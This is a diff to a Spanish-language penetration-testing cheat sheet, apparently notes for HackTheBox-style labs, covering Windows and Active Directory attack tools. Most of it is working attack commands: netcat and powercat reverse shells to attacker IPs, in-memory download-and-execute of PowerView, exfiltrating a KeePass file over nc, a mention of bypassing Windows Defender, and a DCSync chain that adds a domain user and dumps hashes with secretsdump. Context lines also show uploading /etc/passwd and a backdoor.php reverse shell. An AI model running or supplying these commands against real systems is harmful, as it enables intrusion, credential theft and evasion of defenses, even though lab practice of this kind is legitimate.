@@ -126,6 +126,127 @@ gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-mediu
 ```
 ## Tools
 
+### Certipy
+https://github.com/ly4k/Certipy
+
+### FullPowers
+https://github.com/itm4n/FullPowers
+FullPowers is a Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
+```cmd
+FullPowers
+FullPowers -c "powershell -ep Bypass"
+FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+### LinEnum
+https://github.com/rebootuser/LinEnum
+
+### linuxprivchecker
+https://github.com/sleventyeleven/linuxprivchecker
+```sh
+python linuxprivchecker.py -w -o linuxprivchecker.log
+```
+### mimikatz
+https://github.com/ParrotSec/mimikatz
+
+### PowerCat
+https://github.com/besimorhino/powercat
+
+### Powermad
+https://github.com/Kevin-Robertson/Powermad
+
+### PowerView
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+
+
+### PrivescCheck
+
+Cargar el script
+```cmd
+. .\PrivescCheck.ps1
+
+Set-ExecutionPolicy Bypass -Scope process -Force
+. .\PrivescCheck.ps1
+
+Get-Content .\PrivescCheck.ps1 | Out-String | IEX
+```
+Uso 
+```sh
+Invoke-PrivescCheck -Extended
+Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)"
+```
+
+### Rubeus
+https://github.com/GhostPack/Rubeus
+
+### SharpHound
+https://github.com/BloodHoundAD/SharpHound
+
+
+
+### username-anarchy
+https://github.com/urbanadventurer/username-anarchy
+
+Formatos
+```sh
+./username-anarchy --list-formats
+Plugin name         	Example
+--------------------------------------------------------------------------------
+first               	anna
+firstlast           	annakey
+first.last          	anna.key
+firstlast[8]        	annakey
+firstl              	annak
+f.last              	a.key
+flast               	akey
+lfirst              	kanna
+l.first             	k.anna
+lastf               	keya
+last                	key
+last.f              	key.a
+last.first          	key.anna
+FLast               	AKey
+first1              	anna0,anna1,anna2
+fl                  	ak
+fmlast              	abkey
+firstmiddlelast     	annaboomkey
+fml                 	abk
+FL                  	AK
+FirstLast           	AnnaKey
+First.Last          	Anna.Key
+Last                	Key
+FML                 	ABK
+```
+```sh
+./username-anarchy --input-file ./test-names.txt  --select-format first.last
+andrew.horton
+jim.vongrippenvud
+peter.otoole
+```
+### windapsearch
+windapsearch is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.
+```sh
+./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -U
+./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -s albert
+./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -C -r
+windapsearch# ./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 --da
+```
+### accesschk
+```cmd
+accesschk.exe /accepteula (always do this first!!!!!)
+accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
+accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
+accesschk.exe -ucqv [service_name]
+```
+// Find all weak folder permissions per drive.
+```cmd
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+```
+// Find all weak file permissions per drive.
+```cmd
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+```
 ### Git
 
 https://github.com/arthaud/git-dumper.git
@@ -521,19 +642,23 @@ curl --upload-file /etc/passwd http://10.10.10.10
 ```
 
 ## Pasar archivos de windows a mi maquina
-
+```sh
 nc.exe -w 3 10.10.14.45 1235 < archivo.kdbx
 nc -lp 1235 > miarchivo.kdbx
-
+```cmd
 
 ## Descargar desde powershell
 ```cmd
 EX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
 iwr -uri http://10.10.14.65:8000/SharpHound.exe -Outfile SharpHound.exe
-iwr -uri http://10.10.14.65:8000/winPEASx64.exe -Outfile winPEASx64.exe
 
+En memoria 
+
+iex (New-Object net.webclient).Downloadstring('http://10.10.14.217:8000/PowerView.ps1')
+
+Bypass-4MSI para bypasear al Windows Defender
+Invoke-Binary para mandar un binario desde la conexión con tu máquina de atacante, puedes dar tab para que él te muestre donde está (básicamente pwd en tu máquina) y escribes el nombre del archivo
 ```
-powershell "iwr -uri http://10.10.14.65:8000/SharpHound.exe -Outfile "
 
 ## TFTP
 
@@ -646,6 +771,21 @@ http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.
 
 # Explotacion
 
+## Agregar un usuario a windows para luego dumpear hash - POWERVIEW
+
+Exchange windows permissions permite modificar permisos, grupos y usuarios. Esto nos permite luego dumpear las hashes con secretsdump
+Funciona SOLAMENTE si se tiene los permisos y los grupos de "Exchange Windows Permissions" y "Remote Management Users"
+
+```sh
+net user ema password123 /add /domain 
+net group "Exchange Windows Permissions" ema /add
+net localgroup "Remote Management Users" ema /add
+$pass = Convertto-SecureString "password123" -AsPlain -force
+$cred = New-Object System.management.automation.pscredential ("HTB\ema",$pass)
+add-objectacl -principalidentity ema -credential $cred -rights DCSync
+
+impacket-secretsdump HTB.local/ema@10.10.10.161
+```
 ## Macros
 
 Pasar esto a base64
